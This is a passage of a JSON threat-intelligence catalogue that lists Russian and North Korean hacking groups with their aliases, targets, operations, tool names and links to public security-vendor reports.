(2018), Overlaps with Zebrocy"}, {"names": ["APT29", "Dukes", "Group 100", "Cozy Duke", "EuroAPT", "Cozy Bear", "CozyCar", "Cozer", "Office Monkeys / TEMP.Monkeys", "Minidionis", "SeaDuke", "Hammer Toss", "Fritillary", "IRON HEMLOCK"], "targets": "This threat actor targets government ministries and agencies in Europe, the US, Central Asia, East Africa, and the Middle East, associated with DNC attacks", "operations": ["Operation Ghost"], "description": "phishing emails", "tools": ["Hammertoss", "OnionDuke", "CosmicDuke", "MiniDuke", "CozyDuke", "SeaDuke", "SeaDaddy implant developed in Python and compiled with py2exe", "AdobeARM", "ATI-Agent", "MiniDionis", "Grizzly Steppe", "Vernaldrop", "Tadpole", "Spikerush", "POSHSPY", "PolyglotDuke", "RegDuke", "FatDuke"], "links": ["https://aptnotes.malwareconfig.com/web/viewer.html?file=../APTnotes/2015/apt29-hammertoss-stealthy-tactics-define-a.pdf", "https://labsblog.f-secure.com/2015/09/17/the-dukes-7-years-of-russian-cyber-espionage/", "https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/", "https://www2.fireeye.com/rs/848-DID-242/images/rpt-apt29-hammertoss.pdf", "http://www.volexity.com/blog/", "https://www.us-cert.gov/sites/default/files/publications/AR-17-20045_Enhanced_Analysis_of_GRIZZLY_STEPPE_Activity.pdf", "https://www2.fireeye.com/rs/848-DID-242/images/RPT-M-Trends-2017.pdf", "https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html", "https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html", "https://securelist.com/the-cozyduke-apt/69731/", "https://www.welivesecurity.com/2019/10/17/operation-ghost-dukes-never-left/"], "attck_id": null, "comment": "Active campaign post 2016 US presidential election"}, {"names": ["Turla Group ", "Snake", "Venomous Bear", "Group 88", "Waterbug", "Turla Team", "Krypton", "Uroburos", "SIG23", "MAKERSMARK", "ITG12", "IRON HUNTER"], "targets": "Targeting several governments and sensitive businesses such as the defense industry", "operations": ["Satellite Turla", "Epic Turla", "The 'Penquin' Turla", "Witchcoven", "RUAG hack", "Mosquito", "Moonlight Maze"], "description": null, "tools": ["systeminfo", "net", "tasklist", "gpresult", "wce", "pwdump", "Uroburos", "Turla", "Agent.BTZ", "Tavdig", "Wipbot", "Agent.dne", "AdobeARM", "ATI-Agent", "MiniDionis", "WhiteBear", "Gazer", "Neuron", "Nautilus"], "links": ["https://securelist.com/analysis/publications/65545/the-epic-turla-operation/", "https://securelist.com/blog/research/72081/satellite-turla-apt-command-and-control-in-the-sky/", "https://securelist.com/blog/research/67962/the-penquin-turla-2/", "https://www2.fireeye.com/rs/848-DID-242/images/rpt-witchcoven.pdf", "https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/waterbug-attack-group.pdf", "https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/", "https://www.welivesecurity.com/2017/06/06/turlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram/", "https://securelist.com/kopiluwak-a-new-javascript-payload-from-turla/77429/", "https://www.proofpoint.com/us/threat-insight/post/turla-apt-actor-refreshes-kopiluwak-javascript-backdoor-use-g20-themed-attack", "https://www.welivesecurity.com/2017/08/30/eset-research-cyberespionage-gazer/", "https://www.govcert.admin.ch/blog/22/technical-report-about-the-ruag-espionage-case", "http://www.sueddeutsche.de/digital/it-sicherheit-einbrechen-ausbreiten-abgreifen-1.3887843", "https://www.welivesecurity.com/2018/05/22/turla-mosquito-shift-towards-generic-tools/", "https://www.ncsc.gov.uk/alerts/turla-group-malware", "https://motherboard.vice.com/en_us/article/vvk83b/moonlight-maze-turla-link", "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180251/Penquins_Moonlit_Maze_PDF_eng.pdf", "https://www.wired.com/2017/04/russian-hackers-used-backdoor-two-decades/", "https://www.crowdstrike.com/blog/meet-crowdstrikes-adversary-of-the-month-for-march-venomous-bear/", "https://www.symantec.com/blogs/threat-intelligence/waterbug-espionage-governments", "https://securelist.com/turla-renews-its-arsenal-with-topinambour/91687/", "https://securelist.com/shedding-skin-turlas-fresh-faces/88069/", "https://twitter.com/lehtior2/status/893085897226412036", "https://www.ncsc.gov.uk/news/turla-group-exploits-iran-apt-to-expand-coverage-of-victims", "https://medium.com/chronicle-blog/who-is-gossipgirl-3b4170f846c0"], "attck_id": null, "comment": "Turla also uses OilRig's (APT34) implants "}, {"names": ["Energetic Bear", "Dragonfly", "Crouching Yeti", "Group 24", "Koala Team", "Berserk Bear", "Anger Bear", "Dymalloy", "Havex", "PEACEPIPE", "Fertger", "IRON LIBERTY"], "targets": "This threat actor targets companies in the education, energy, construction, information technology, and pharmaceutical sectors for the purposes of espionage. It uses malware tailored to target industrial control systems. Energy, Middle East oil and natural gas as the goal, dedicated to gather relevant information, technology company in Western Europe that produces civil, military and critical infrastructure communications equipment", "operations": [], "description": "Active", "tools": ["Havex RAT", "Oldrea", "LightsOut ExploitKit", "Inveigh", "PsExec", "Persistence through .LNK file manipulations", "Nmap", "Dirsearch", "Sqlmap", "Sublist3r", "Wpscan", "Impacket", "SMBTrap", "Commix", "Subbrute", "PHPMailer", "Web Shells (PHP)", "MCMD"], "links": ["http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/Dragonfly_Threat_Against_Western_Energy_Suppliers.pdf", "http://www.netresec.com/?page=Blog&month=2014-10&post=Full-Disclosure-of-Havex-Trojans", "https://threatpost.com/energy-watering-hole-attack-used-lightsout-exploit-kit/104772/", "https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group", "https://securelist.com/blog/incidents/35520/the-teamspy-crew-attacks-abusing-teamviewer-for-cyberespionage-8/", "https://www.us-cert.gov/ncas/alerts/TA17-293A", "https://threatmatrix.cylance.com/en_us/home/energetic-dragonfly-dymalloy-bear-2-0.html", "https://securelist.com/energetic-bear-crouching-yeti/85345/", "https://www.fireeye.com/content/dam/fireeye-www/company/events/infosec/threat-landscape-overview-fireeye-summit-paris.pdf", "https://insights.sei.cmu.edu/cert/2019/03/api-hashing-tool-imagine-that.html", "https://www.secureworks.com/research/updated-karagany-malware-targets-energy-sector", "https://www.secureworks.com/research/mcmd-malware-analysis", "https://www.secureworks.com/blog/own-the-router-own-the-traffic"], "attck_id": null, "comment": "Detected in Middle East networks in 2014, Compromise via spear phish or SWC, Motivation somewhat unclear; CrowdStrike lists Berserk Bear as separate group (evolution of Energetic) while Symantec sees Energetic Bear and Berserk Bear as single group named Dragonfly"}, {"names": ["Sandworm", "Sandworm Team", "TEMP.Noble", "Electrum", "TeleBots", "Quedagh Group", "BE2 APT", "Black Energy", "Iridium", "Hades", "Voodoo Bear", "Quedagh", "Iron Viking", "Grey Energy", "IRON VIKING"], "targets": "This threat actor targets industrial control systems, using a tool called Black Energy, associated with electricity and power generation for espionage, denial of service, and data destruction purposes. Ukrainian energy sector, Eastern Europe. ", "operations": ["Black Energy", "Ukrenergo", "NPetya, NotPetya"], "description": null, "tools": ["CVE-2014-4114", "Industroyer", "CrashOverride", "OlympicDestroyer", "GreyEngergy Mini as their 1st-stage implant", "GCat", "Delphocy", "Zebrocy", "Zekapab"], "links": ["http://www.isightpartners.com/2014/10/cve-2014-4114/", "http://www.isightpartners.com/2016/01/ukraine-and-sandworm-team/", "https://www.welivesecurity.com/wp-content/uploads/2017/06/Win32_Industroyer.pdf", "https://www.us-cert.gov/ncas/alerts/TA17-163A", "https://ics.sans.org/blog/2016/01/09/confirmation-of-a-coordinated-attack-on-the-ukrainian-power-grid", "https://www.welivesecurity.com/2017/06/30/telebots-back-supply-chain-attacks-against-ukraine/", "https://securelist.com/from-blackenergy-to-expetr/78937/", "https://securelist.com/blackenergy-apt-attacks-in-ukraine-employ-spearphishing-with-word-documents/73440/", "https://securelist.com/be2-custom-plugins-router-abuse-and-target-profiles/67353/", "https://securelist.com/greyenergys-overlap-with-zebrocy/89506/", "https://securelist.com/be2-extraordinary-plugins-siemens-targeting-dev-fails/68838/", "https://www.secureworks.com/research/resurgent-iron-liberty-targeting-energy-sector", "https://dragos.com/wp-content/uploads/CRASHOVERRIDE.pdf", "https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/", "https://www.crowdstrike.com/blog/meet-crowdstrikes-adversary-of-the-month-for-january-voodoo-bear/", "https://securelist.com/olympicdestroyer-is-here-to-trick-the-industry/84295/", "https://securelist.com/olympic-destroyer-is-still-alive/86169/"], "attck_id": null, "comment": "Linked to Kiev Dec2016 ICS cyberattack"}, {"names": ["FIN7", "Carbanak", "Anunak", "Carbon Spider"], "targets": "Bank of Valetta, Malta", "operations": [], "description": null, "tools": ["PowerSource"], "links": ["https://www.icebrg.io/blog/footprints-of-fin7-tracking-actor-patterns", "https://www.proofpoint.com/us/threat-insight/post/fin7carbanak-threat-actor-unleashes-bateleur-jscript-backdoor", "https://blog.cyber4sight.com/2017/04/similarities-between-carbanak-and-fin7-malware-suggest-actors-are-closely-related/", "https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html", "https://www.rsa.com/content/dam/en/white-paper/the-carbanak-fin7-syndicate.pdf", "https://www.rsa.com/content/dam/premium/en/white-paper/the-shadows-of-ghosts-carbanak-report.pdf", "https://www.flashpoint-intel.com/blog/fin7-revisited-inside-astra-panel-and-sqlrat-malware/", "https://securelist.com/fin7-5-the-infamous-cybercrime-rig-fin7-continues-its-activities/90703/", "https://securityaffairs.co/wordpress/64083/apt/fin7-new-techniques.html", "https://www.fireeye.com/blog/threat-research/2019/10/mahalo-fin7-responding-to-new-tools-and-techniques.html", "https://blog.malwarebytes.com/threat-analysis/2019/10/the-forgotten-domain-exploring-a-link-between-magecart-group-5-and-the-carbanak-apt/", "https://www.fortinet.com/blog/threat-research/bioload-fin7-boostwrite-lost-twin.html", "https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/would-you-exchange-your-security-for-a-gift-card/"], "attck_id": null, "comment": "Overlaps with Carbanak (but not the same group)"}, {"names": ["FIN8"], "targets": "Hotel-Entertainment Industry, POS malware attack", "operations": [], "description": null, "tools": ["PowerSniff", "PUNCHBUGGY", "PUNCHTRACK", "ShellTea", "BADHATCH", "PoSlurp"], "links": ["https://unit42.paloaltonetworks.com/powersniff-malware-used-in-macro-based-attacks/", "https://www.fireeye.com/blog/threat-research/2016/05/windows-zero-day-payment-cards.html", "https://www.root9b.com/sites/default/files/whitepapers/PoS%20Malware%20ShellTea%20PoSlurp_YARA.pdf", "https://www.fireeye.com/blog/threat-research/2017/06/obfuscation-in-the-wild.html", "http://blog.morphisec.com/security-alert-fin8-is-back", "https://atr-blog.gigamon.com/2019/07/23/abadbabe-8badf00d-discovering-badhatch-and-a-detailed-look-at-fin8s-tooling/"], "attck_id": null, "comment": null}, {"names": ["Inception Framework"], "targets": "This threat actor targets governments and diplomatic organizations for espionage purposes. Suspected Operator in Ukraine working for Russia or its allies.", "operations": ["Red October", "Cloud Atlas"], "description": null, "tools": [], "links": ["https://securelist.com/blog/incidents/57647/the-red-october-campaign/", "http://securelist.com/blog/research/68083/cloud-atlas-redoctober-apt-is-back-in-style/", "https://www.symantec.com/blogs/threat-intelligence/inception-framework-hiding-behind-proxies", "https://www.bluecoat.com/security-blog/2014-12-09/blue-coat-exposes-%E2%80%9C-inception-framework%E2%80%9D-very-sophisticated-layered-malware", "https://unit42.paloaltonetworks.com/unit42-inception-attackers-target-europe-year-old-office-vulnerability/", "https://securelist.com/recent-cloud-atlas-activity/92016/"], "attck_id": null, "comment": null}, {"names": ["TeamSpy Crew", "SIG39"], "targets": "This threat actor primarily compromises government entities and human rights activists in Eastern Europe and Central Asia for espionage purposes. It has also compromised private and public sector entities in the Middle East and in Western countries.", "operations": ["TeamSpy"], "description": null, "tools": ["Malicious TeamViewer versions", "JAVA RATs"], "links": ["http://kasperskycontenthub.com/wp-content/uploads/sites/43/vlpdfs/theteamspystory_final_t2.pdf", "https://blog.crysys.hu/2018/03/territorial-dispute-nsas-perspective-on-apt-landscape/"], "attck_id": null, "comment": null}, {"names": ["BuhTrap", "Ratopak"], "targets": null, "operations": [], "description": null, "tools": ["AmmyAdmin", "LURK", "NSIS", "Mimikatz", "CVE-2012-0158", "PuntoSwitcher (like Keylogger)"], "links": ["https://www.welivesecurity.com/2015/04/09/operation-buhtrap/", "http://www.welivesecurity.com/2015/11/11/operation-buhtrap-malware-distributed-via-ammyy-com/", "http://www.group-ib.com/brochures/gib-buhtrap-report.pdf", "https://www.netscout.com/blog/asert/diving-buhtrap-banking-trojan-activity", "https://www.welivesecurity.com/2019/07/11/buhtrap-zero-day-espionage-campaigns/"], "attck_id": null, "comment": null}, {"names": ["Carberb"], "targets": "USA", "operations": [], "description": null, "tools": [], "links": ["http://itlaw.wikia.com/wiki/Moonlight_Maze"], "attck_id": null, "comment": null}, {"names": ["???"], "targets": "Swiss defence department", "operations": ["RUAG Espionage"], "description": null, "tools": ["Turla Family", "Uroburos", "Snake (Carbon) Rootkit", "Tavdig/Wipbot/Epic", "Mimikatz", "dsquery", "dsget"], "links": ["https://www.govcert.admin.ch/blog/22/technical-report-about-the-ruag-espionage-case"], "attck_id": null, "comment": null}, {"names": ["FSB 16th & 18th Centers", "Gamaredon Group", "BlueAlpha"], "targets": null, "operations": ["OP Armageddon", "Op Gamework"], "description": null, "tools": [], "links": ["https://lookingglasscyber.com/wp-content/uploads/2015/08/Operation_Armageddon_FINAL.pdf", "http://researchcenter.paloaltonetworks.com/2017/02/unit-42-title-gamaredon-group-toolset-evolution/", "https://blog.yoroi.company/research/the-russian-shadow-in-eastern-europe-ukrainian-mod-campaign/", "https://www.recordedfuture.com/bluealpha-iranian-apts/"], "attck_id": null, "comment": "Hijack infrastructure of Iranian APT33, APT35 & Muddywater"}, {"names": ["Cyber Berkut"], "targets": "Bellingcat", "operations": [], "description": null, "tools": [], "links": ["https://www.threatconnect.com/blog/russia-hacks-bellingcat-mh17-investigation/#.V-wnrubaeEU.twitter"], "attck_id": null, "comment": "During Ukrainian Revolution"}, {"names": ["WhiteBear", "Skipper Turla"], "targets": "embassies and diplomatic/foreign affair organizations, defense-related organizations", "operations": [], "description": null, "tools": ["Kopiluwak"], "links": ["https://securelist.com/introducing-whitebear/81638/"], "attck_id": null, "comment": "Associated with Turla"}, {"names": ["???"], "targets": "This threat actor targets critical infrastructure entities in the oil and gas sector, primarily in Ukraine. The threat actors deploy the BugDrop malware to remotely access the microphones in their targets' computers to eavesdrop on conversations.", "operations": ["BugDrop"], "description": null, "tools": [], "links": ["https://cyberx-labs.com/en/blog/operation-bugdrop-cyberx-discovers-large-scale-cyber-reconnaissance-operation/"], "attck_id": null, "comment": null}, {"names": ["GRU GTsST (Main Center for Special Technology)"], "targets": null, "operations": [], "description": null, "tools": ["NotPetya"], "links": ["https://www.washingtonpost.com/world/national-security/russian-military-was-behind-notpetya-cyberattack-in-ukraine-cia-concludes/2018/01/12/048d8506-f7ca-11e7-b34a-b85626af34ef_story.html?utm_term=.23e3c7810049"], "attck_id": null, "comment": null}, {"names": ["TEMP.Veles", "Xenotime", "Triton"], "targets": "Oil refinery, other infrastructure", "operations": [], "description": null, "tools": ["Triton"], "links": ["https://www.fireeye.com/blog/threat-research/2018/10/triton-attribution-russian-government-owned-lab-most-likely-built-tools.html", "https://dragos.com/resource/xenotime/", "https://dragos.com/resource/trisis-analyzing-safety-system-targeting-malware/", "https://www.fireeye.com/blog/threat-research/2017/12/attackers-deploy-new-ics-attack-framework-triton.html", "https://www.fireeye.com/blog/threat-research/2019/04/triton-actor-ttp-profile-custom-attack-tools-detections.html", "https://www.fireeye.com/blog/threat-research/2018/06/totally-tubular-treatise-on-triton-and-tristation.html", "https://dragos.com/wp-content/uploads/NA-EL-Threat-Perspective-2019.pdf"], "attck_id": null, "comment": null}, {"names": ["Zebrocy", "Zebrocy"], "targets": "Germany, Indonesia, the United States, Taiwan, India, France, Serbia, Ecuador, Argentina, South Korea, Japan, China, Britain, South Africa, Italy, Hong Kong, Romania, Ukraine, Macedonia, Russia, Switzerland, Senegal, the Philippines, UAE, Qatar, Saudi Arabia, Pakistan, Thailand, Bahrain, Turkey, Bulgaria, Bangladesh", "operations": [], "description": null, "tools": [], "links": ["https://securelist.com/a-zebrocy-go-downloader/89419/", "https://unit42.paloaltonetworks.com/sofacy-creates-new-go-variant-of-zebrocy-tool/", "https://unit42.paloaltonetworks.com/dear-joohn-sofacy-groups-global-campaign/", "https://unit42.paloaltonetworks.com/unit42-sofacy-continues-global-attacks-wheels-new-cannon-trojan/", "https://securelist.com/zebrocys-multilanguage-malware-salad/90680/"], "attck_id": null, "comment": null}, {"names": ["SectorJ04"], "targets": null, "operations": [], "description": null, "tools": ["Dridex", "The Trick", "Locky", "Jaff", "FlawedAmmyy", "GraceWire    malicious software signed with valid digital signatures"], "links": ["https://threatrecon.nshc.net/2019/08/29/sectorj04-groups-increased-activity-in-2019/", "https://www.bankinfosecurity.com/ta505-apt-group-returns-new-techniques-report-a-13678", "https://www.databreachtoday.com/two-russians-indicted-over-100m-dridex-malware-thefts-a-13473", "https://www.mcafee.com/enterprise/en-us/threat-center/threat-landscape-dashboard/campaigns-details.operation-sectorj04-2019.html"], "attck_id": null, "comment": "TTP indicates possibly TA505  Microsoft Security Intelligence and McAfee Teams have affiliated TA505 with SectorJ04 aka Evil Corp aka Dudear since 2014 - reference in Link2     Department of Justice issues warrant for arrest of Dridex member, whom is working for Russian FSB since 2017"}, {"names": ["FullofDeep"], "targets": null, "operations": [], "description": null, "tools": ["QNAPCrypt ransomware"], "links": ["https://www.intezer.com/blog-russian-cybercrime-group-fullofdeep-behind-qnapcrypt-ransomware-campaigns/"], "attck_id": null, "comment": "Operates from Union State & Ukraine"}]}}, {"north_korea": {"actors": [{"names": ["Lazarus Group", "Labyrinth Chollima", "Bureau 121", "Unit 121", "Whois Hacking Team", "NewRomanic Cyber Army Team", "Zinc", "Appleworm", "Hidden Cobra", "Nickel Academy"], "targets": "Believed to be responsible for Dark Seoul, Ten Days of Rain, the Sony Pictures Entertainment attack,\u00c2\u00a0the SWIFT-related bank heists, and WannaCry. Known to the U.S. government as Hidden Cobra. Targeting also BitCoin Exchanges, financial sector, technology/engineering sector", "operations": ["Blockbuster", "Dark Seoul", "Applejeus"], "description": "Delivery: usually via spear phishing email.Infrastructure: C2 often based on compromised servers,moving to own servers paid by bitcoin to preserve anonymityPersistency: tipically launching ransomware after operation to destroy evidences", "tools": ["Tdrop", "Tdrop2", "Troy", "Destover", "FallChill RAT", "Volgmer", "Hawup", "Manuscrypt", "WolfRAT", "SheepRAT", "HtDnDownLoader"], "links": ["http://www.mcafee.com/us/resources/white-papers/wp-dissecting-operation-troy.pdf", "http://researchcenter.paloaltonetworks.com/2015/11/tdrop2-attacks-suggest-dark-seoul-attackers-return/", "https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf", "https://www.alienvault.com/open-threat-exchange/blog/operation-blockbuster-unveils-the-actors-behind-the-sony-attacks", "https://www.us-cert.gov/ncas/alerts/TA17-164A", "http://www.fsec.or.kr/common/proc/fsec/bbs/21/fileDownLoad/1235.do", "https://researchcenter.paloaltonetworks.com/2017/08/unit42-blockbuster-saga-continues/", "https://www.crowdstrike.com/blog/unprecedented-announcement-fbi-implicates-north-korea-destructive-attacks/", "https://www.us-cert.gov/ncas/alerts/TA17-318A", "https://www.us-cert.gov/ncas/alerts/TA17-318B", "https://www.proofpoint.com/sites/default/files/pfpt-us-wp-north-korea-bitten-by-bitcoin-bug.pdf", "https://securingtomorrow.mcafee.com/mcafee-labs/lazarus-resurfaces-targets-global-banks-bitcoin-users/", "https://www.darkreading.com/vulnerabilities---threats/lazarus-group-fancy-bear-most-active-threat-groups-in-2017/d/d-id/1330954?print=yes", "https://www.us-cert.gov/HIDDEN-COBRA-North-Korean-Malicious-Cyber-Activity", " https://securelist.com/operation-applejeus/87553/", "https://blogs.microsoft.com/on-the-issues/2017/12/19/microsoft-facebook-disrupt-zinc-malware-attack-protect-customers-internet-ongoing-cyberthreats/", "https://www.secureworks.com/about/press/media-alert-secureworks-discovers-north-korean-cyber-threat-group-lazarus-spearphishing", "https://threatrecon.nshc.net/2019/01/23/sectora01-custom-proxy-utility-tool-analysis/", "https://objective-see.com/blog/blog_0x49.html", "https://www.sentinelone.com/blog/lazarus-apt-targets-mac-users-poisoned-word-document/", "https://blog.alyac.co.kr/2827"], "attck_id": null, "comment": "Threat Recon.nshc.net alias=SectorA01"}, {"names": ["Group123 ", "Ricochet Chollima", "APT37", "Red Eyes", "Reaper", "Venus 121 (\u00ea\u00b8\u0088\u00ec\u0084\u00b1121)", "THALLIUM"], "targets": "Primarily South Korea \u00e2\u0080\u0093 though also Japan, Vietnam and the Middle East \u00e2\u0080\u0093 in various industry verticals, including chemicals, electronics, manufacturing, aerospace, automotive, and healthcare; Scarcruft Tracking: Russia, Nepal, South Korea, China, India, Kuwait and Romania", "operations": ["Erebus", "Golden Time", "Evil New Year", "Are you Happy?", "FreeMilk", "North Korean Human Rights", "Evil New Year 2018"], "description": null, "tools": ["KARAE", "SOUNDWAVE", "ZUMKONG", "RICECURRY", "CORALDECK", "POORAIM", "SLOWDRIFT", "MILKDROP", "GELCAPSULE", "DOGCALL", "HAPPYWORK", "RUHAPPY", "SHUTTERSPEED", "Flash Exploit CVE-2016-4117", "ROKRAT", "KEVDROID", "BabyShark", "KimJongRAT"], "links": ["https://www.fireeye.com/blog/threat-research/2018/02/apt37-overlooked-north-korean-actor.html", "http://blog.talosintelligence.com/2018/01/korea-in-crosshairs.html", "https://securelist.com/blog/research/75082/cve-2016-4171-adobe-flash-zero-day-used-in-targeted-attacks/", "https://exchange.xforce.ibmcloud.com/collection/Fear-The-Reaper-North-Korean-Group-APT37-dc96e8bdff7573efb87d43d7584c1fbc", "https://unit42.paloaltonetworks.com/unit42-nokki-almost-ties-the-knot-with-dogcall-reaper-group-uses-new-malware-to-deploy-rat/", "https://unit42.paloaltonetworks.com/unit42-reaper-groups-updated-mobile-arsenal/", "https://blog.alyac.co.kr/1985", "https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/", "https://securelist.com/scarcruft-continues-to-evolve-introduces-bluetooth-harvester/90729/", "https://blogs.microsoft.com/on-the-issues/2019/12/30/microsoft-court-action-against-nation-state-cybercrime/", "https://www.zdnet.com/article/microsoft-takes-down-50-domains-operated-by-north-korean-hackers/?mid=1#cid=8960026"], "attck_id": null, "comment": "FireEye iSIGHT Intelligence believes that APT37 is aligned with the activity publicly reported as Scarcruft and Group123"}, {"names": ["DarkHotel", "Luder", "Karba", "Tapaoux", "Nemim", "APT-C-06", "SIG25", "Dubnium", "Fallout Team"], "targets": "Japan, Taiwan, China, Russia, and South Korea, North KoreaGovernment, Utilities, High-Tech, Automotive", "operations": ["Inexsmar", "Daybreak", "Wizard Opium", "Higaisa"], "description": "Information on Chinese forum indicating group may have targeted CVE-2015-8651, most likely a South Korean actor", "tools": ["Win32.Karba", "Win32.Pioneer", "CVE-2015-8651", "Asruex", "CVE-2012-0158", "CVE-2010-2883", "CVE-2016-4171 and CVE-2018-817"], "links": ["https://securelist.com/blog/research/66779/the-darkhotel-apt/", "http://drops.wooyun.org/tips/11726", "https://labs.bitdefender.com/wp-content/uploads/downloads/inexsmar-an-unusual-darkhotel-campaign/", "http://www.wired.com/2014/11/darkhotel-malware/", "https://securelist.com/operation-daybreak/75100/", "https://www.forcepoint.com/sites/default/files/resources/files/report_jaku_analysis_of_botnet_campaign_en_0.pdf", "https://research.checkpoint.com/silivaccine-a-look-inside-north-koreas-anti-virus/", "https://github.com/aptnotes/data/issues/56", "https://blogs.jpcert.or.jp/en/2016/06/asruex-malware-infecting-through-shortcut-files.html", "https://blog.trendmicro.com/trendlabs-security-intelligence/asruex-backdoor-variant-infects-word-documents-and-pdfs-through-old-ms-office-and-adobe-vulnerabilities/", "https://blog.trendmicro.com/trendlabs-security-intelligence/asruex-backdoor-variant-infects-word-documents-and-pdfs-through-old-ms-office-and-adobe-vulnerabilities/", "https://securelist.com/chrome-0-day-exploit-cve-2019-13720-used-in-operation-wizardopium/94866/", "https://translate.google.com/translate?hl=&sl=zh-CN&tl=en&u=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FW87E6_v9YCnsmQWDd7NOHw&sandbox=1", "https://s.tencent.com/research/report/836.html"], "attck_id": null, "comment": null}, {"names": ["Andariel", "Silent Chollima"], "targets": "Information gathering and profit", "operations": ["DesertWolf", "Vanxatm", "Mayday", "INITROY", "XEDA", "Sony"], "description": null, "tools": ["RifDoor", "Phandoor"], "links": ["https://www.scmagazineuk.com/war-plans-including-assassination-plan-stolen-by-north-korean-hackers/article/699089/", "https://gsec.hitb.org/materials/sg2017/D1%20-%20Ashley%20Shen%20and%20Moonbeom%20Park%20-%20A%20Deep%20Dive%20into%20the%20Digital%20Weapons%20of%20the%20North%20Korean%20Cyber%20Army.pdf", "http://www.fsec.or.kr/user/bbs/fsec/21/13/bbsDataView/910.do", "http://online.wsj.com/public/resources/documents/print/WSJ_-A006-20170728.pdf", "https://blog.trendmicro.com/trendlabs-security-intelligence/new-andariel-reconnaissance-tactics-hint-at-next-targets/"], "attck_id": null, "comment": "Lazarus subgroup"}, {"names": ["Kimsuki", "Velvet Chollima", "Kimsuky"], "targets": "This threat actor targets South Korean think tanks, industry, nuclear power operators, and the Ministry of Unification for espionage purposes.", "operations": [], "description": null, "tools": ["KPortScan", "PsExec", "Procdump", "Mimikatz", "Eternal suite of exploits", "NirSoft MailPassView/Network Password Recovery/Remote Desktop PassView/SniffPass/WebBrowserPassView", "Mechanical", "Grease"], "links": ["http://securelist.com/analysis/57915/the-kimsuky-operation-a-north-korean-apt/", "http://www.reuters.com/article/us-nuclear-southkorea-northkorea-idUSKBN0MD0GR20150317", "https://asert.arbornetworks.com/stolen-pencil-campaign-targets-academia/", "https://apt.securelist.com/#!/threat/972", "https://www.anomali.com/blog/suspected-north-korean-cyber-espionage-campaign-targets-multiple-foreign-ministries-and-think-tanks#When:14:00:00Z", "https://crowdstrike.lookbookhq.com/web-global-threat-report-2019/crowdstrike-2019-gtr", "https://www.zdnet.com/article/cyber-espionage-group-uses-chrome-extension-to-infect-victims/", "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2019-ACT-009.pdf", "https://blog.alyac.co.kr/2243", "https://blog.alyac.co.kr/attachment/cfile5.uf@99A0CD415CB67E210DCEB3.pdf", "https://blog.prevailion.com/2019/09/autumn-aperture-report.html", "https://www.dailynk.com/english/north-korean-hackers-mount-phishing-attack-nkhr-groups/", "https://blog.yoroi.company/research/the-north-korean-kimsuky-apt-keeps-threatening-south-korea-evolving-its-ttps/", "https://asec.ahnlab.com/1313?category=342979", "https://blog.alyac.co.kr/2906"], "attck_id": null, "comment": null}, {"names": ["NoName"], "targets": null, "operations": [], "description": null, "tools": ["malware with name \"mySingleMessenger.exe\""], "links": ["http://securityfactory.tistory.com/332"], "attck_id": null, "comment": "NorthKorea vs Samsung"}, {"names": ["OnionDog"], "targets": "This threat actor targets the South Korean government, transportation, and energy sectors.", "operations": [], "description": null, "tools": [], "links": ["http://news.softpedia.com/news/korean-energy-and-transportation-targets-attacked-by-oniondog-apt-501534.shtml", "http://zhuiri.360.cn/upload/APT-C-03-en.pdf", "http://www.chinadaily.com.cn/china/2016-03/09/content_23794129.htm", "http://news.softpedia.com/news/korean-energy-and-transportation-targets-attacked-by-oniondog-apt-501534.shtml"], "attck_id": null, "comment": "False Positive. APT Training by SK Government"}, {"names": ["TEMP.Hermit", "APT38"], "targets": "Korean Peninsula, US Aerospace, SWIFT-fraud operations in East Asia", "operations": [], "description": null, "tools": ["VOLGMER", "PEACHPIT"], "links": ["https://www.isightpartners.com/2016/02/threatscape-media-highlights-update-week-of-february-17th/", "http://www.scmagazine.com/sony-hackers-are-still-hacking-researchers-say/article/474166/", "https://www.fireeye.com/blog/threat-research/2018/10/apt38-details-on-new-north-korean-regime-backed-threat-group.html"], "attck_id": null, "comment": null}, {"names": ["?"], "targets": "Humanitarian Aid Groups", "operations": [], "description": null, "tools": ["MaoCheng Dropper"], "links": ["https://securingtomorrow.mcafee.com/mcafee-labs/mcafee-uncovers-operation-honeybee-malicious-document-campaign-targeting-humanitarian-aid-groups/"], "attck_id": null, "comment": null}, {"names": ["Stardust Chollima", "Stardust Chollima", "APT38", "ElectricFish", "BlueNoroff"], "targets": "Latin America, Mexico, Costa Rica, Chile, Argentina, financial institutions in Asia and Africa in 2018", "operations": ["Far Eastern International Bank"], "description": null, "tools": ["Dimens", "MBR Killer", "ElectricFish"], "links": ["https://app.cdn.lookbookhq.com/lbhq-production/10339/content/original/9dd0e31a-c9c0-4e1c-aea1-f35d3e930f3d/CrowdStrike_GTR_2019_.pdf", "https://www.crowdstrike.com/blog/meet-crowdstrikes-adversary-of-the-month-for-april-stardust-chollima/", "https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/", "https://baesystemsai.blogspot.com/2017/10/taiwan-heist-lazarus-tools.html", "https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/", "https://techcrunch.com/2019/08/15/cyber-command-north-korea-malware/"], "attck_id": null, "comment": null}, {"names": [], "targets": null, "operations": [], "description": "Media, government, but mainly financial institutions in order to raise money for the North Korean regime: Russia, Turkey, US, Poland, Mexico, Brazil, Ururguay, Taiwan, Malaysia, Chile, Vietnam, Philippines", "tools": [], "links": 